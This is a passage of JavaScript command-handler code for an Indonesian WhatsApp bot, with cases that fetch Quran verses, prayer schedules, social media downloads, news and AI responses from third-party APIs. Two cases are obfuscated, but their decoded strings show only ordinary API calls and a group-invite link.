                if (!args[1]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                newReply(txt)
            }
            break
            // Islami Fitur
            case 'asmaulhusna':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `No : ${data.result.index}\n`
					text += `Latin: ${data.result.latin}\n`
					text += `Arab : ${data.result.ar}\n`
					text += `Indonesia : ${data.result.id}\n`
					text += `English : ${data.result.en}`
					newReply(text)
				})
				.catch(console.error)
			break
			
			case 'alquranaudio': {
                if (args.length == 0) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                newReply(mess.wait)
                conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}`}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            break
            
            case 'alquran':
			if (args.length < 1) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
				.then(({ data }) => {
					var ayat = data.result.ayat
					var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
					for (var x of ayat) {
						text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
					}
					text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
					text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
					newReply(text)
				})
				.catch(console.error)
            break
            
			case 'jadwalsolat': {
            if (!text) return newReply('Mana Kotanya?')
            newReply(mess.wait)
            let anu = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${text}?apikey=${apikey}`)
            newReply(`Wilayah: ${anu.result.wilayah}\n\nTanggal: ${anu.result.tanggal}\nSahur: ${anu.result.sahur}\nImsak: ${anu.result.imsak}\nTerbit: ${anu.result.terbit}\nDhuha: ${anu.result.dhuha}\nDzuhur: ${anu.result.dzuhur}\nAshar: ${anu.result.ashar}\nMagrib: ${anu.result.maghrib}\nIsya: ${anu.result.isya}`)
            }
            break
            
            case 'kisahnabi':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Muhammad`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/kisahnabi/${full_args}?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `Name : ${data.result.name}\n`
					text += `Lahir : ${data.result.thn_kelahiran}\n`
					text += `Umur : ${data.result.age}\n`
					text += `Tempat : ${data.result.place}\n`
					text += `Story : \n${data.result.story}`
					newReply(text)
				})
				.catch(console.error)
			break
			
            case 'listsurah':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
				.then(({ data }) => {
					var text = 'List Surah:\n'
					for (var x in data.result) {
						text += `${x}. ${data.result[x]}\n`
					}
					newReply(text)
				})
				.catch(console.error)
			break
			
			// DOWNLOADER FITUR
			case 'git': case 'gitclone': {
                if (!args[0]) return newReply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            }       
            break
			case 'ytplay':
			if (args.length == 0) return await newReply(`Example: ${prefix + command} melukis senja`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Title    : *${data.result.title}*\n`
						caption += `❖ Size     : *${data.result.size}*`
						conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
							conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
			
			case 'ytmp3':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
			
		    case 'ytmp4':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						conn.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
				.catch(console.error)
			break
			
			case 'tiktok': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			case 'tiktokaudio': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			newReply(mess.wait)
			conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apikey}&url=${args[0]}` }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
			
			}
			break
			
			case 'igdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				var url = data.result[0]
				if (url.includes('.mp4')) {
					conn.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
				} else {
					conn.sendMessage(m.chat, { image: { url } })
				}
			})
			
            }
			break
			
		    case 'igdl2': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				for (var x of data.result) {
					if (x.includes('.mp4')) {
						conn.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
					} else {
						conn.sendMessage(m.chat, { image: { url: x } })
					}
				}
			})
			
			}
			break
			
			case 'twtdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
		    case 'fbdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			// Tools Fitur
			case 'style':
            case 'styletext': {
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    styletext
                } = require('./lib/scraper')
                if (!text) return newReply('Masukkan Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🖋️ *${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'hapus': 
            case 'delete': 
            case 'del': 
            case 'd': {
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            
            case 'q':
            case 'quoted': {
                if (!m.quoted) return newReply('Reply Pesannya!!')
                let wokwol = await conn.serializeM(await m.getQuotedObj())
                if (!wokwol.quoted) return newReply('Pesan Yang Anda Reply Tidak Mengandung Reply')
                await wokwol.quoted.copyNForward(m.chat, true)
            }
            break
            
            case 'ebinary': {
                let {
                    eBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let eb = await eBinary(teks)
                newReply(eb)
            }
            break
            case 'dbinary': {
                let {
                    dBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let db = await dBinary(teks)
                newReply(db)
            }
            break
            
            case 'ssweb':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${args[0]}`}, caption: `${mess.done}`}, { quoted: m})
			break
			
		    case 'ssweb2':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/sswebfull?apikey=${apikey}&url=${args[0]}`}, caption: `${mess.done}`}, { quoted: m})
			break
			
		    case 'shortlink':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
			axios.get(`https://api.lolhuman.xyz/api/ouoshortlink?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				newReply(data.result)
			})
			break
			
			// AI FITUR
			case 'aiimage': {
			if (!isPremium) return newReply(mess.prem)
            if (args.length == 0) return newReply(`Membuat gambar dari AI.\n\nContoh :\n${prefix+command} rumah mewah`)
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/dall-e?apikey=${apikey}&text=${args[0]}` }, caption: `${args[0]}` }, {quoted:m})
            }
            break
            
            case 'diffusion':
            function _0x3a56(_0x51ac12, _0x569112) {
    var _0x26d98c = _0x29a3();
    return _0x3a56 = function (_0xaab6a0, _0x4d13d5) {
        _0xaab6a0 = _0xaab6a0 - (-0x131 + 0x585 * -0x3 + 0x13a9);
        var _0x192d5c = _0x26d98c[_0xaab6a0];
        return _0x192d5c;
    }, _0x3a56(_0x51ac12, _0x569112);
}
function _0x29a3() {
    var _0x479c63 = [
        'ed=-1&rati',
        '45EYpfkW',
        '21jUICxT',
        'then',
        '230772glOqau',
        'o=1%3A1&st',
        'tra%20hand',
        '/diffusion',
        'length',
        'mage_num=1',
        'nline),\x20hi',
        'result',
        '1008847QQOFYU',
        'get',
        'Example\x20',
        'ow%20quali',
        'metadata',
        '9090834zTAlHp',
        'sendMessag',
        'i.itsrose.',
        'https://ap',
        'rst%20qual',
        'ty%2C%20ex',
        '?prompt=',
        'prompt',
        '824222vcytkB',
        '4.0&steps=',
        'led',
        'images',
        '25&control',
        '115UolSdx',
        '&apikey=',
        'mpler=Eule',
        'yle=ACG&sa',
        'site/image',
        '218794yFKIoa',
        'r%20a&cfg=',
        'word\x20art\x20o',
        'prompt=(wo',
        '2405728XDxSvc',
        'Net=none&i',
        ')%2C%20mon',
        '&negative_',
        'ghly\x20detai',
        '\x20asuna,\x20(s',
        '33121020zxlgcf',
        'chat',
        'ochrome&se',
        'ity%2C%20l'
    ];
    _0x29a3 = function () {
        return _0x479c63;
    };
    return _0x29a3();
}
var _0x4d7b87 = _0x3a56;
(function (_0x43cb46, _0x5db891) {
    var _0x12a8f4 = _0x3a56, _0x3a7f86 = _0x43cb46();
    while (!![]) {
        try {
            var _0x4c8870 = parseInt(_0x12a8f4(0x218)) / (0x2066 + -0x1eb8 + 0x3 * -0x8f) + parseInt(_0x12a8f4(0x1fe)) / (-0x11c0 + 0x112f + 0x93) * (parseInt(_0x12a8f4(0x20e)) / (0x1 * -0x865 + 0x25 * -0xc3 + -0x13 * -0x1ed)) + -parseInt(_0x12a8f4(0x210)) / (0xb1 + 0x9d * -0x30 + 0x1cc3) * (parseInt(_0x12a8f4(0x1f9)) / (-0x1036 + 0x8b * 0x38 + -0xe2d)) + -parseInt(_0x12a8f4(0x1ec)) / (-0x38a + 0xe1c * 0x1 + -0xa8c) + parseInt(_0x12a8f4(0x1f4)) / (0x197 + 0x215 * 0x7 + -0x9 * 0x1cb) + -parseInt(_0x12a8f4(0x202)) / (0x1365 * -0x1 + 0x54f * -0x3 + 0x235a) * (parseInt(_0x12a8f4(0x20d)) / (0x1956 + 0x149 * 0x12 + -0x306f)) + parseInt(_0x12a8f4(0x208)) / (-0x56 * -0x57 + -0x676 * -0x2 + -0x1ea * 0x16);
            if (_0x4c8870 === _0x5db891)
                break;
            else
                _0x3a7f86['push'](_0x3a7f86['shift']());
        } catch (_0x237ef5) {
            _0x3a7f86['push'](_0x3a7f86['shift']());
        }
    }
}(_0x29a3, -0x2 * 0x7ec9b + 0x4f191 * -0x1 + 0x21e587));
if (args[_0x4d7b87(0x214)] == -0xa7 * 0xd + 0x64f * 0x5 + 0x90 * -0x29)
    return newReply(_0x4d7b87(0x1e9) + (prefix + command) + (_0x4d7b87(0x207) + _0x4d7b87(0x200) + _0x4d7b87(0x216) + _0x4d7b87(0x206) + _0x4d7b87(0x1f6)));
axios[_0x4d7b87(0x219)](_0x4d7b87(0x1ef) + _0x4d7b87(0x1ee) + _0x4d7b87(0x1fd) + _0x4d7b87(0x213) + _0x4d7b87(0x1f2) + args[0xce2 + 0x1 * -0x14d1 + 0x7ef] + (_0x4d7b87(0x205) + _0x4d7b87(0x201) + _0x4d7b87(0x1f0) + _0x4d7b87(0x20b) + _0x4d7b87(0x1ea) + _0x4d7b87(0x1f1) + _0x4d7b87(0x212) + _0x4d7b87(0x204) + _0x4d7b87(0x20a) + _0x4d7b87(0x20c) + _0x4d7b87(0x211) + _0x4d7b87(0x1fc) + _0x4d7b87(0x1fb) + _0x4d7b87(0x1ff) + _0x4d7b87(0x1f5) + _0x4d7b87(0x1f8) + _0x4d7b87(0x203) + _0x4d7b87(0x215) + _0x4d7b87(0x1fa)) + rosekey)[_0x4d7b87(0x20f)](({data: _0x123418}) => {
    var _0x17c6a0 = _0x4d7b87;
    conn[_0x17c6a0(0x1ed) + 'e'](m[_0x17c6a0(0x209)], {
        'image': { 'url': _0x123418[_0x17c6a0(0x217)][_0x17c6a0(0x1f7)] },
        'caption': '' + _0x123418[_0x17c6a0(0x217)][_0x17c6a0(0x1eb)][_0x17c6a0(0x1f3)]
    }, { 'quoted': m });
});
            break
            case  'ai2':{
                const _0x3d0de4 = _0x2b07;
(function (_0x24cb82, _0xbf7ded) {
    const _0x2f1cc7 = _0x2b07, _0x2216bd = _0x24cb82();
    while (!![]) {
        try {
            const _0x3a48af = -parseInt(_0x2f1cc7(0xa2)) / (0x2 * 0x59 + 0x3 * -0x887 + 0x76 * 0x36) * (-parseInt(_0x2f1cc7(0x9c)) / (-0x18c + -0x515 * -0x4 + -0x12c6)) + -parseInt(_0x2f1cc7(0xa4)) / (0x7b1 + 0x1 * 0x1cb5 + -0x2463) * (parseInt(_0x2f1cc7(0x99)) / (-0x1f07 + -0x155a + 0x3465)) + parseInt(_0x2f1cc7(0x9b)) / (-0x526 * 0x5 + -0x1ae2 + 0x34a5) * (-parseInt(_0x2f1cc7(0x9d)) / (0x136d + 0x3 * -0x62 + -0x1 * 0x1241)) + -parseInt(_0x2f1cc7(0x92)) / (0x201b * 0x1 + -0x1 * 0x1f7 + -0x1e1d) * (parseInt(_0x2f1cc7(0x97)) / (0x2087 + 0x1 * -0x874 + 0x5 * -0x4cf)) + -parseInt(_0x2f1cc7(0x8b)) / (0x13 * -0xdf + 0x1070 + 0x26) * (parseInt(_0x2f1cc7(0x85)) / (0xf54 * 0x1 + -0x20b * -0x3 + -0x156b)) + -parseInt(_0x2f1cc7(0x8f)) / (-0xece + 0xe62 + 0x77) + parseInt(_0x2f1cc7(0xa9)) / (0x1157 + -0xc * 0x6b + -0x1 * 0xc47);
            if (_0x3a48af === _0xbf7ded)
                break;
            else
                _0x2216bd['push'](_0x2216bd['shift']());
        } catch (_0x507510) {
            _0x2216bd['push'](_0x2216bd['shift']());
        }
    }
}(_0x2109, 0x83ad * 0x6 + -0x7c5d7 + 0x1155bb));
if (!q)
    return newReply(_0x3d0de4(0xa8) + _0x3d0de4(0xa6));
function _0x2b07(_0x320475, _0x5716f8) {
    const _0x5e81f1 = _0x2109();
    return _0x2b07 = function (_0x4ac287, _0x273ed2) {
        _0x4ac287 = _0x4ac287 - (-0x922 + 0xe68 + -0x4c1);
        let _0x1a7490 = _0x5e81f1[_0x4ac287];
        return _0x1a7490;
    }, _0x2b07(_0x320475, _0x5716f8);
}
newReply(mess[_0x3d0de4(0x9e)]);
function _0x2109() {
    const _0x7e77c8 = [
        '66642852rhZWQO',
        '476750zAXXYa',
        'sender',
        'users',
        'https://ch',
        'PHOTO',
        '&apikey=',
        '153oqIUhr',
        'PT/complet',
        'limit',
        'eUBzTFPFdR',
        '9373892bIVMyd',
        'site/chatG',
        'p.com/K3KD',
        '161HlPWOT',
        'i.itsrose.',
        'get',
        'uptime',
        'at.whatsap',
        '143648IifCLH',
        'sendMessag',
        '184aBWItL',
        'ions?promp',
        '7683950FDLSED',
        '277658aVlReM',
        '6nYGxqj',
        'wait',
        'Bot\x20aktif\x20',
        'https://ap',
        'data',
        '2hTufMh',
        'message',
        '90645uEBBvE',
        'chat',
        'na\x20om',
        'soY4wQN2',
        'Teksnya\x20ma'
    ];
    _0x2109 = function () {
        return _0x7e77c8;
    };
    return _0x2109();
}
if (!isPremium && global['db'][_0x3d0de4(0xa1)][_0x3d0de4(0x87)][m[_0x3d0de4(0x86)]][_0x3d0de4(0x8d)] < -0x1166 + 0x2131 * -0x1 + -0xca6 * -0x4)
    return onlyLimit();
let {data} = await axios[_0x3d0de4(0x94)](_0x3d0de4(0xa0) + _0x3d0de4(0x93) + _0x3d0de4(0x90) + _0x3d0de4(0x8c) + _0x3d0de4(0x9a) + 't=' + q + _0x3d0de4(0x8a) + rosekey);
conn[_0x3d0de4(0x98) + 'e'](m[_0x3d0de4(0xa5)], {
    'contextInfo': {
        'externalAdReply': {
            'showAdAttribution': !![],
            'title': '' + ucapanWaktu,
            'body': _0x3d0de4(0x9f) + runtime(process[_0x3d0de4(0x95)]()),
            'previewType': _0x3d0de4(0x89),
            'thumbnail': thumb,
            'sourceUrl': _0x3d0de4(0x88) + _0x3d0de4(0x96) + _0x3d0de4(0x91) + _0x3d0de4(0x8e) + _0x3d0de4(0xa7)
        }
    },
    'image': thumb,
    'caption': data[_0x3d0de4(0xa3)]
}, { 'quoted': m });
            }
            break
            
            case 'ai':
			if (args.length == 0) return newReply(`Example: ${prefix + command} ai adalah`)
			axios.get(`https://api.lolhuman.xyz/api/openai?apikey=${apikey}&text=${encodeURIComponent(full_args)}&user=${senderNumber}`).then(({ data }) => {
				newReply(data.result)
			})
			break
			
			
            // Information Fitur
            case 'pinterest': {
                if (!text) return newReply(`Example : ${prefix + command}`)
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
		        let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'google': {
                if (!text) return newReply(`Contoh : ${prefix + command} fatih arridho`)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                newReply(teks)
                })
                }
            break
            
            case 'gimage': {
                if (!text) return newReply(`Contoh : ${prefix + command} `)
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    conn.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                })
            }
            break
            case 'infochat': {
                if (!m.quoted) newReply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `👤 @${i.userJid.split('@')[0]}\n`
                    teks += `⏳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}\n📈 *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'kbbi':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} kursi`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${full_args}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			newReply(titid)
			}
			break
		case 'brainly':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${full_args}`)
			var ti  = 'Beberapa Pembahasan Dari Brainly :\n\n'
			for (var x of data.result) {
				ti  += `==============================\n`
				ti  += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ti  += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ti  += `==============================\n\n`
			}
			newReply(ti )
			}
			break
		    case 'roboguru':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${full_args}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var tit = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				tit += `==============================\n`
				tit += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				tit += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				tit += `==============================\n\n`
			}
			newReply(tit)
			}
			break
			
		    case 'jarak':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} jakarta - yogyakarta`)
			var titt1 = full_args.split('-')[0].trim()
			var titt2 = full_args.split('-')[1].trim()
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${titt1}&kota2=${titt2}`)
			var titt = `Informasi Jarak dari ${titt1} ke ${titt2} :\n\n`
			titt += `\`\`\`◪ Asal :\`\`\` ${data.result.from.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.from.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.from.longitude}\n\n`
			titt += `\`\`\`◪ Tujuan :\`\`\` ${data.result.to.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.to.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.to.longitude}\n\n`
			titt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${data.result.jarak}\n`
			titt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
			titt += `   ╭───────────────❏\n`
			titt += `❍┤ Kereta Api : ${data.result.kereta_api}\n`
			titt += `❍┤ Pesawat : ${data.result.pesawat}\n`
			titt += `❍┤ Mobil : ${data.result.mobil}\n`
			titt += `❍┤ Motor : ${data.result.motor}\n`
			titt += `❍┤ Jalan Kaki : ${data.result.jalan_kaki}\n`
			titt += `   ╰───────────────❏\n`
			newReply(titt)
			}
			break
			
			case 'wikipedia':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Tahu`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'translate':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} en Tahu Bacem`)
			newReply(mess.wait)
			var kode_negara = args[0]
			args.shift()
			var tittt = args.join(' ')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${apikey}&text=${tittt}`)
			init_txt = `From : ${data.result.from}\n`
			init_txt += `To : ${data.result.to}\n`
			init_txt += `Original : ${data.result.original}\n`
			init_txt += `Translated : ${data.result.translated}\n`
			init_txt += `Pronunciation : ${data.result.pronunciation}\n`
			newReply(init_txt)
			}
			break
			
		    case 'jadwaltv':
			if (args.length == 0) return newReply(`Example: ${prefix + command} RCTI`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
			newReply(mess.wait)
			var titttt = `Jadwal TV ${args[0].toUpperCase()}\n`
			for (var x in data.result) {
				titttt += `${x} - ${data.result[x]}\n`
			}
			newReply(titttt)
			break
			
		    case 'jadwaltvnow':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttt = `Jadwal TV Now :\n`
			for (var x in data.result) {
				tittttt += `${x.toUpperCase()}${data.result[x]}\n\n`
			}
			newReply(tittttt)
			break
			
		    case 'newsinfo':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttt = 'Result :\n'
			for (var x of data.result) {
				titttttt += `Title : ${x.title}\n`
				titttttt += `Author : ${x.author}\n`
				titttttt += `Source : ${x.source.name}\n`
				titttttt += `Url : ${x.url}\n`
				titttttt += `Published : ${x.publishedAt}\n`
				titttttt += `Description : ${x.description}\n\n`
			}
			newReply(titttttt)
			}
			break
			
		    case 'cnnindonesia':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttt += `Judul : ${x.judul}\n`
				tittttttt += `Link : ${x.link}\n`
				tittttttt += `Tipe : ${x.tipe}\n`
				tittttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttt)
			}
			break
			
		    case 'cnnnasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttt = 'Result :\n'
			for (var x of data.result) {
				titttttttt += `Judul : ${x.judul}\n`
				titttttttt += `Link : ${x.link}\n`
				titttttttt += `Tipe : ${x.tipe}\n`
				titttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(titttttttt)
			}
			break
			
		    case 'cnninternasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttttt += `Judul : ${x.judul}\n`
